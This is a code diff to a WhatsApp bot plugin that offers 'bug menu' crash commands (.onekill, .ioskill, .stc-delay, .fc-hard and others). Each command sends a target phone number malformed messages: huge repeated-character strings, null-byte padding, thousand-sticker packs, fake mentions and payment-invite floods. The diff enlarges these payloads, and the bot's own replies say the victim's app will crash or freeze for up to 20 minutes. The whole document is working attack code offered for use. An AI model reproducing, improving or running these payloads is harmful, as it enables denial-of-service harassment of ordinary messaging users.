@@ -27,7 +27,7 @@ async function ttaas(conn, target) {
         mimetype: "image/jpeg",
         fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
         fileLength: "93217",
-        caption: "7eppsynC",
+        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
         height: 1080,
         width: 1080,
         mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
@@ -48,7 +48,7 @@ async function ttaas(conn, target) {
                     product: {
                         productImage: imageMessage,
                         productId: "449756950375071",
-                        title: "7eppsynC",
+                        title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ",
                         description: "",
                         priceAmount1000: { low: 999, high: 0, unsigned: false },
                         url: "wa.me/status",
@@ -83,127 +83,95 @@ async function BnAM2(conn, target) {
                     },
                     newsletterAdminInviteMessage: {
                         newsletterJid: "120363408195391812@newsletter",
-                        newsletterName: "𑇂".repeat(50000) + i,
-                        caption: "N!ted ☆ B!tch" + "ꦾ".repeat(18000) + i,
+                        newsletterName: "𑇂".repeat(90000) + i,
+                        caption: "N!ted ☆ B!tch" + "ꦾ".repeat(90000) + i,
                         inviteExpiration: "1775164528"
                     }
                 }
             }
         }, {});
         await conn.relayMessage(target, msg.message, {});
-        // NO DELAY – sends all 30 instantly
     }
 }
 
-// ==================== .stc-delay (sticker pack overflow – instant send) ====================
-async function stcdelayxryy(conn, target) {
-    const stc = Array.from({ length: 1000 }, (_, i) => ({
-        fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${i + 1}.webp`,
-        isAnimated: true,
-        emojis: ["🍁"],
-        accessibilityLabel: "🪷",
-        mimetype: "image/webp"
-    }));
-    const mentionedJid = [
-        target,
-        ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
-    ];
-    const msg = generateWAMessageFromContent(target, {
-        viewOnceMessage: {
-            message: {
-                stickerPackMessage: {
-                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-                    name: "ꦾ".repeat(90000),
-                    publisher: "XRyy",
-                    stickers: stc,
-                    fileLength: "3662919",
-                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
-                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
-                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
-                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
-                    contextInfo: {
-                        remoteJid: "X",
-                        participant: "0@s.whatsapp.net",
-                        stanzaId: "1234567890ABCDEF",
-                        mentionedJid: mentionedJid
-                    },
-                    mediaKeyTimestamp: "1747502082",
-                    trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
-                    thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
-                    thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
-                    thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
-                    thumbnailHeight: 252,
-                    thumbnailWidth: 252,
-                    imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
-                    stickerPackSize: "3680054",
-                    stickerPackOrigin: "USER_CREATED",
-                    forwardedNewsletterMessageInfo: {
-                        newsletterJid: "120363321780343299@newsletter",
-                        newsletterName: "makludelay" + "ી".repeat(50000),
-                        jpegThumbnail: null,
-                        caption: "MakluDelay" + "ી".repeat(50000),
-                        inviteExpiration: Date.now() + 1814400000
+// ==================== .stc-delay (100 sticker packs – INSTANT, NO DELAYS) ====================
+async function stcSpam100(conn, target) {
+    for (let pack = 0; pack < 150; pack++) {
+        const stc = Array.from({ length: 1000 }, (_, i) => ({
+            fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${pack}_${i + 1}.webp`,
+            isAnimated: true,
+            emojis: ["🍁"],
+            accessibilityLabel: "🪷",
+            mimetype: "image/webp"
+        }));
+        const mentionedJid = [
+            target,
+            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
+        ];
+        const msg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    stickerPackMessage: {
+                        stickerPackId: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5_${pack}`,
+                        name: "ꦾ".repeat(90000) + pack,
+                        publisher: "XRyy",
+                        stickers: stc,
+                        fileLength: "3662919",
+                        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
+                        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
+                        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
+                        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
+                        contextInfo: {
+                            remoteJid: "X",
+                            participant: "0@s.whatsapp.net",
+                            stanzaId: "1234567890ABCDEF",
+                            mentionedJid: mentionedJid
+                        },
+                        mediaKeyTimestamp: "1747502082",
+                        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
+                        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
+                        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
+                        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
+                        thumbnailHeight: 252,
+                        thumbnailWidth: 252,
+                        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
+                        stickerPackSize: "3680054",
+                        stickerPackOrigin: "USER_CREATED",
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "120363321780343299@newsletter",
+                            newsletterName: "makludelay" + "ી".repeat(50000) + pack,
+                            jpegThumbnail: null,
+                            caption: "Sʜᴀᴠɪʏᴀ Xᴍᴅ" + "ી".repeat(50000) + pack,
+                            inviteExpiration: Date.now() + 1814400000
+                        }
                     }
                 }
             }
-        }
-    }, {});
-    await conn.relayMessage(target, msg.message, {});
+        }, {});
+        await conn.relayMessage(target, msg.message, {});
+    }
 }
 
-// ==================== YOUR OTHER BUG FUNCTIONS (NO DELAYS) ====================
-const oneclickxeon = {
-    key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
-    message: { listResponseMessage: { title: `𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2` } }
-};
-
-const force = {
-    key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
-    message: {
-        interactiveMessage: {
-            header: { hasMediaAttachment: true },
-            nativeFlowMessage: {
-                buttons: [{
-                    name: "review_and_pay",
-                    buttonParamsJson: `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\"}`
-                }]
+// ==================== FIXED oneKillCombo (no quoting, direct sends) ====================
+async function oneKillCombo(conn, target) {
+    // 1. List message with long title + product list
+    const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
+        listMessage: {
+            title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "\0".repeat(920000),
+            footerText: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
+            description: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
+            buttonText: null,
+            listType: 2,
+            productListInfo: {
+                productSections: [{ title: 'anjay', products: [{ productId: "4392524570816732" }] }],
+                businessOwnerJid: '0@s.whatsapp.net'
             }
         }
-    }
-};
+    }), { userJid: target });
+    await conn.relayMessage(target, listMsg.message, { participant: { jid: target }, messageId: listMsg.key.id });
 
-const force2 = {
-    key: { participant: `0@s.whatsapp.net`, remoteJid: "status@broadcast" },
-    message: {
-        interactiveMessage: {
-            header: { hasMediaAttachment: true },
-            nativeFlowMessage: {
-                buttons: [{
-                    name: "review_and_pay",
-                    buttonParamsJson: `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100}}`
-                }]
-            }
-        }
-    }
-};
-
-async function blackening(socket, target, kuwoted) {
-    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-        stickerMessage: {
-            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
-            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
-            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
-            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
-            mimetype: "image/webp",
-            fileLength: "10116",
-            isAnimated: false
-        }
-    }), { userJid: target, quoted: kuwoted });
-    await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
-}
-
-async function locationxeony(socket, target, kuwoted) {
-    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    // 2. Live location message (malformed)
+    const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         viewOnceMessage: {
             message: {
                 liveLocationMessage: {
@@ -215,46 +183,86 @@ async function locationxeony(socket, target, kuwoted) {
                 }
             }
         }
-    }), { userJid: target, quoted: kuwoted });
-    await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
-}
+    }), { userJid: target });
+    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 
-async function xeonkillpic(socket, target, kuwoted) {
-    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+    // 3. Interactive message (malformed buttons)
+    const interactiveMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
         interactiveMessage: {
             header: { title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2", hasMediaAttachment: true },
             body: { text: "" },
             footer: { text: "› #𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" },
-            nativeFlowMessage: { messageParamsJson: "".repeat(1000000) }
+            nativeFlowMessage: { messageParamsJson: "\0".repeat(1000000) }
         }
-    }), { userJid: target, quoted: kuwoted });
-    await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+    }), { userJid: target });
+    await conn.relayMessage(target, interactiveMsg.message, { participant: { jid: target }, messageId: interactiveMsg.key.id });
+
+    // 4. Another live location
+    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
+
+    // 5. Sticker message (malformed)
+    const stickerMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
+        stickerMessage: {
+            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
+            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+            mimetype: "image/webp",
+            fileLength: "10116",
+            isAnimated: false
+        }
+    }), { userJid: target });
+    await conn.relayMessage(target, stickerMsg.message, { participant: { jid: target }, messageId: stickerMsg.key.id });
+
+    // 6. Final live location
+    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
 }
 
-async function aipong(socket, target) {
-    await socket.relayMessage(target, {
+// ==================== FIXED mixed command (live location + list spam) ====================
+async function sendMixedMessages(conn, target, count) {
+    for (let i = 0; i < count; i++) {
+        // Live location
+        const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: 'p',
+                        degreesLongitude: 'p',
+                        caption: '丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ' + 'ꦾ'.repeat(50000),
+                        sequenceNumber: '0',
+                        jpegThumbnail: ''
+                    }
+                }
+            }
+        }), { userJid: target });
+        await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
+
+        // List message
+        const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
+            listMessage: {
+                title: "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
+                footerText: "Xeon Bug",
+                description: "Xeon Bug",
+                buttonText: null,
+                listType: 2,
+                productListInfo: {
+                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
+                    businessOwnerJid: "0@s.whatsapp.net"
+                }
+            }
+        }), { userJid: target });
+        await conn.relayMessage(target, listMsg.message, { participant: { jid: target }, messageId: listMsg.key.id });
+    }
+}
+
+// ==================== OTHER WORKING FUNCTIONS (unchanged, but ensure direct sends) ====================
+async function aipong(conn, target) {
+    await conn.relayMessage(target, {
         paymentInviteMessage: { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 }
     }, { participant: { jid: target } });
 }
 
-async function listxeonfck(socket, target, kuwoted) {
-    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
-        listMessage: {
-            title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "".repeat(920000),
-            footerText: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
-            description: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
-            buttonText: null,
-            listType: 2,
-            productListInfo: {
-                productSections: [{ title: 'anjay', products: [{ productId: "4392524570816732" }] }],
-                businessOwnerJid: '0@s.whatsapp.net'
-            }
-        }
-    }), { userJid: target, quoted: oneclickxeon });
-    await socket.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
-}
-
-async function sendSystemCrashMessage(socket, jid) {
+async function sendSystemCrashMessage(conn, jid) {
     var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
         viewOnceMessage: {
             message: {
@@ -273,10 +281,10 @@ async function sendSystemCrashMessage(socket, jid) {
             }
         }
     }), { userJid: jid });
-    await socket.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
+    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
 }
 
-async function sendListMessage(socket, jid) {
+async function sendListMessage(conn, jid) {
     var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
         listMessage: {
             title: "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
@@ -290,10 +298,10 @@ async function sendListMessage(socket, jid) {
             }
         }
     }), { userJid: jid });
-    await socket.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
+    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
 }
 
-async function sendLiveLocationMessage(socket, jid) {
+async function sendLiveLocationMessage(conn, jid) {
     var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
         viewOnceMessage: {
             message: {
@@ -307,16 +315,10 @@ async function sendLiveLocationMessage(socket, jid) {
             }
         }
     }), { userJid: jid });
-    await socket.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
+    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
 }
 
-async function sendPaymentInvite(socket, jid) {
-    await socket.relayMessage(jid, {
-        paymentInviteMessage: { serviceType: "UPI", expiryTimestamp: Date.now() + 86400000 }
-    }, { participant: { jid: jid } });
-}
-
-async function sendViewOnceMessages(socket, jid, count) {
+async function sendViewOnceMessages(conn, jid, count) {
     for (let i = 0; i < count; i++) {
         let messageContent = generateWAMessageFromContent(jid, {
             viewOnceMessage: {
@@ -335,44 +337,21 @@ async function sendViewOnceMessages(socket, jid, count) {
                 }
             }
         }, {});
-        await socket.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
-        // NO DELAY – sends all view‑once messages instantly
+        await conn.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
     }
 }
 
-async function sendVariousMessages(socket, jid, count) {
+async function sendVariousMessages(conn, jid, count) {
     for (let i = 0; i < count; i++) {
-        await sendListMessage(socket, jid);
-        await sendLiveLocationMessage(socket, jid);
-        await sendSystemCrashMessage(socket, jid);
-        // NO DELAY – sends all three immediately
+        await sendListMessage(conn, jid);
+        await sendLiveLocationMessage(conn, jid);
+        await sendSystemCrashMessage(conn, jid);
     }
 }
 
-async function sendMixedMessages(socket, jid, count) {
-    for (let i = 0; i < count; i++) {
-        await sendLiveLocationMessage(socket, jid);
-        await sendListMessage(socket, jid);
-        // NO DELAY
-    }
-}
-
-async function oneKillCombo(socket, target) {
-    for (let j = 0; j < 1; j++) {
-        await listxeonfck(socket, target, oneclickxeon);
-        await locationxeony(socket, target, force);
-        await xeonkillpic(socket, target, oneclickxeon);
-        await locationxeony(socket, target, force);
-        await blackening(socket, target, force2);
-        await locationxeony(socket, target, force);
-        // NO DELAY – all six send instantly
-    }
-}
-
-async function iosKill(socket, target, duration = 10) {
+async function iosKill(conn, target, duration = 10) {
     for (let i = 0; i < duration; i++) {
-        await aipong(socket, target);
-        // NO DELAY – sends all 10 payment invites instantly
+        await aipong(conn, target);
     }
 }
 
@@ -399,33 +378,33 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "fc-hard");
     if (!target) return;
-    await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites (no delay)..._`);
+    await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites..._`);
     await BnAM2(conn, target);
     await reply(`✅ FC-HARD SPAM SENT → ${target}\n⚠️ *Target WhatsApp will crash when they open the app. Effect lasts 5‑10 min.*`);
 });
 
 cmd({
     pattern: "stc-delay",
-    desc: "Sticker pack overflow (1000 stickers + long name + 1900 mentions)",
+    desc: "100 sticker packs – each with 1000 stickers (instant flood)",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "stc-delay");
     if (!target) return;
-    await reply(`📚 *STC-DELAY SPAM* → ${target}\n_Sending massive sticker pack (instant)..._`);
-    await stcdelayxryy(conn, target);
-    await reply(`✅ STC-DELAY SENT → ${target}\n⚠️ *Target will experience heavy lag/crash for 5‑10 minutes.*`);
+    await reply(`📚 *STC-DELAY 100 PACKS* → ${target}\n_Sending 100 massive sticker packs..._`);
+    await stcSpam100(conn, target);
+    await reply(`✅ STC-DELAY (100 PACKS) SENT → ${target}\n⚠️ *Target will experience extreme lag/crash for 10‑20 minutes.*`);
 });
 
 cmd({
     pattern: "onekill",
-    desc: "One kill combo (list + location + sticker + more)",
+    desc: "One kill combo (list + location + sticker + more) – FIXED",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "onekill");
     if (!target) return;
-    await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence (instant sends)..._`);
+    await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence..._`);
     await oneKillCombo(conn, target);
     await reply(`✅ ONEKILL COMPLETED → ${target}\n⚠️ *Target will freeze/crash repeatedly for 5‑10 minutes.*`);
 });
@@ -438,7 +417,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "ioskill");
     if (!target) return;
-    await reply(`📱 *IOS KILL* → ${target}\n_Sending 10 payment invites (instant)..._`);
+    await reply(`📱 *IOS KILL* → ${target}\n_Sending 10 payment invites..._`);
     await iosKill(conn, target, 10);
     await reply(`✅ IOS KILL SENT → ${target}\n⚠️ *Target device may become unresponsive for 5‑10 minutes.*`);
 });
@@ -452,20 +431,20 @@ cmd({
     const target = getTarget(args, from, reply, "viewspam");
     if (!target) return;
     const count = parseInt(args[1]) || 5;
-    await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages (no delay)..._`);
+    await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages..._`);
     await sendViewOnceMessages(conn, target, count);
     await reply(`✅ VIEWONCE SPAM SENT → ${target}\n⚠️ *Target will see crashing view‑once bubbles. Effect: 5‑10 min.*`);
 });
 
 cmd({
     pattern: "mixed",
-    desc: "Mixed live location + list spam",
+    desc: "Mixed live location + list spam – FIXED",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "mixed");
     if (!target) return;
-    await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages (instant)..._`);
+    await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages..._`);
     await sendMixedMessages(conn, target, 5);
     await reply(`✅ MIXED CRASH SENT → ${target}\n⚠️ *Target will experience lag/crash for 5‑10 minutes.*`);
 });
@@ -478,7 +457,7 @@ cmd({
 }, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
     const target = getTarget(args, from, reply, "various");
     if (!target) return;
-    await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types (instant)..._`);
+    await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types..._`);
     await sendVariousMessages(conn, target, 3);
     await reply(`✅ VARIOUS CRASH SENT → ${target}\n⚠️ *Target will freeze/crash for 5‑10 minutes.*`);
 });
@@ -491,10 +470,10 @@ cmd({
     filename: __filename
 }, async (conn, mek, m, { from, pushname, sender, reply }) => {
     const menu = `
-*╭─「 👑 COMPLETE BUG MENU (NO DELAYS) 」─*
+*╭─「 👑 COMPLETE BUG MENU (ALL FIXED) 」─*
 *│ 📌 .bug         : ViewOnce product crash*
 *│ 📌 .fc-hard     : 30 admin invites (crash on open)*
-*│ 📌 .stc-delay   : Sticker pack overflow (1000 stickers)*
+*│ 📌 .stc-delay   : 100 sticker packs (1000 stickers each)*
 *│ 📌 .onekill     : One kill combo (list+location+sticker)*
 *│ 📌 .ioskill     : iOS kill (payment invite spam)*
 *│ 📌 .viewspam    : ViewOnce message spam (count optional)*
@@ -506,7 +485,7 @@ cmd({
 *│ 🟢 Total commands : 8*
 *╰──────────────●●►*
 > 💡 *Usage:* .command 947XXXXXXXXX
-> 📌 *Example:* .stc-delay 94712345678
+> 📌 *Example:* .onekill 94712345678
 > 📌 *Example with count:* .viewspam 94712345678 10
 > ⚠️ *After each crash, target will suffer 5‑10 minutes of issues.*
     `;
